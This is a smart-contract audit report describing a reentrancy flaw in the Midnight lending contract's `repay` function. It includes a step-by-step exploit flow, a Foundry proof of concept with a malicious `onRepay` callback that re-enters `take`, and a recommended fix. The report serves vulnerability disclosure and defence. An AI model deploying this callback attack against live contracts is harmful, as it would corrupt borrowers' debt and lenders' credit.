### Title
Reentrancy in `repay` callback allows authorized operator to re-increase victim's debt, violating repay invariant - (File: src/Midnight.sol)

### Summary
`repay` in `src/Midnight.sol` reduces `position[id][onBehalf].debt` at line 508 before invoking the `onRepay` callback at line 516, with no reentrancy guard anywhere in the contract. An authorized operator can supply a malicious callback that re-enters `take` during `onRepay`, increasing the victim's debt back to its original value before the repay token transfer at line 520. The final debt after `repay` equals `debtBefore` instead of `debtBefore - units`, directly violating the core invariant.

### Finding Description
**Exact code path:**

`repay` (lines 502–521):
- Line 505: auth check `isAuthorized[onBehalf][msg.sender]` passes for authorized operator.
- Line 508: `position[id][onBehalf].debt -= UtilsLib.toUint128(units)` — debt reduced to `D - units`.
- Line 509: `marketState[id].withdrawable += UtilsLib.toUint128(units)`.
- Line 516: `IRepayCallback(callback).onRepay(id, market, units, onBehalf, data)` — external call with partial state.
- Line 520: `SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units)` — token pull after callback.

`take` (lines 337–479):
- Line 346: `require(taker == msg.sender || isAuthorized[taker][msg.sender], TakerUnauthorized())`.
- Line 414: `sellerPos.debt += UtilsLib.toUint128(sellerDebtIncrease)` — debt re-increased.
- Line 476: `require(liquidationLocked(id, seller) || isHealthy(...), SellerIsLiquidatable())` — health check passes because debt is back to original healthy level `D`.

**Root cause:** No reentrancy guard; debt state is mutated before the external `onRepay` callback, and `take` accepts any `msg.sender` that is authorized by the taker.

**Exploit flow (attacker_contract is both caller and callback, `isAuthorized[victim][attacker_contract] == true`):**
1. Attacker_contract calls `repay(market, units, victim, attacker_contract, data)`.
2. Auth check at line 505 passes.
3. `victim.debt = D - units` (line 508).
4. `onRepay` fires on attacker_contract (line 516).
5. Inside `onRepay`, attacker_contract calls `take(buyOffer, ratifierData, units, victim, attacker_contract, address(0), "")` with `taker = victim`.
6. Auth check in `take` at line 346 passes: `isAuthorized[victim][attacker_contract] == true`.
7. `victim.debt = D - units + units = D` (line 414).
8. Attacker_contract receives `sellerAssets` loan tokens as receiver.
9. `onRepay` returns `CALLBACK_SUCCESS`.
10. `safeTransferFrom(loanToken, attacker_contract, Midnight, units)` at line 520 — funded by `sellerAssets` received in step 8.

**Why existing checks fail:** The `isAuthorized` check in `take` (line 346) is satisfied because the same authorization that permits the `repay` call also permits the re-entrant `take`. There is no reentrancy lock, no post-callback debt assertion, and no check that debt did not increase during the callback window. The Certora `repayEffects` rule (line 161 of `BalanceEffects.spec`) asserts `debtOf(id, onBehalf) == debtBefore - units` but is verified only under the explicit no-reentrancy assumption stated at line 21–22 of that spec, leaving the real contract unprotected.

### Impact Explanation
Victim's debt is `D` after `repay(market, units, victim, ...)` instead of the required `D - units`. The `repayEffects` invariant is broken. The attacker uses the take proceeds (`sellerAssets`) to self-fund the repay token pull, making the attack zero-net-cost (minus settlement fee). The victim's collateral remains locked against the original debt `D` with no reduction, and the lender's credit increases by `units` backed by the victim's unchanged debt — corrupting the credit/debt matching invariant.

### Likelihood Explanation
Preconditions: (1) `isAuthorized[victim][attacker_contract] == true` — victim voluntarily authorized the attacker, a normal delegation pattern; (2) a valid buy offer exists in the market — routine in any active market; (3) victim has sufficient collateral to support debt `D` — already true since victim was healthy before the repay. All three are realistic and repeatable. The attacker can also first call `setIsAuthorized(maliciousCallback, true, victim)` on behalf of the victim (permitted by their existing authorization) to separate the caller and callback addresses.

### Recommendation
Add a reentrancy guard (e.g., a transient-storage or storage-based lock) to `repay`, `liquidate`, `take`, and `flashLoan`, or enforce checks-effects-interactions strictly: move the `safeTransferFrom` token pull to before the `onRepay` callback so the callback fires only after the protocol has received the tokens and the state is fully settled. Alternatively, snapshot `position[id][onBehalf].debt` before the callback and assert it is unchanged after the callback returns.

// Foundry test — expected: debtOf(id, victim) == D - units; actual: debtOf(id, victim) == D

contract MaliciousRepayCallback {
    IMidnight midnight;
    Offer buyOffer;
    uint256 units;
    address victim;

    constructor(IMidnight _midnight, Offer memory _offer, uint256 _units, address _victim) {
        midnight = _midnight; buyOffer = _offer; units = _units; victim = _victim;
    }

    // Called by repay after debt is reduced but before token transfer
    function onRepay(bytes32, Market memory, uint256, address, bytes memory)
        external returns (bytes32)
    {
        // Re-enter take: victim is seller, this contract is receiver
        // isAuthorized[victim][address(this)] == true, so auth passes
        midnight.take(buyOffer, hex"", units, victim, address(this), address(0), hex"");
        // Approve repay token pull from sellerAssets received above
        IERC20(buyOffer.market.loanToken).approve(address(midnight), units);
        return CALLBACK_SUCCESS;
    }
}

function testRepayReentrancyDebtCorruption() public {
    // Setup: victim borrows `units`, attacker_contract authorized by victim
    uint256 D = units;
    vm.prank(victim);
    midnight.setIsAuthorized(address(maliciousCallback), true, victim);

    uint256 debtBefore = midnight.debtOf(id, victim); // == D

    vm.prank(address(maliciousCallback));
    midnight.repay(market, units, victim, address(maliciousCallback), hex"");

    // BUG: debt is D, not D - units
    assertEq(midnight.debtOf(id, victim), debtBefore);          // passes (shows bug)
    // assertEq(midnight.debtOf(id, victim), debtBefore - units); // fails (expected invariant)
}

/// Repay decreases onBehalf's debt by exactly units and only changes position[id][onBehalf].debt
rule repayEffects(env e, Midnight.Market market, uint256 units, address onBehalf, address callback, bytes data, bytes32 anyId, address anyUser) {
    bytes32 id = toId(e, market);

    uint256 debtBefore = debtOf(id, onBehalf);
    uint256 otherCreditBefore = creditOf(anyId, anyUser);
    uint256 otherDebtBefore = debtOf(anyId, anyUser);

    repay(e, market, units, onBehalf, callback, data);

    assert debtOf(id, onBehalf) == debtBefore - units;
    assert creditOf(anyId, anyUser) == otherCreditBefore;
    assert anyUser != onBehalf || anyId != id => debtOf(anyId, anyUser) == otherDebtBefore;
}
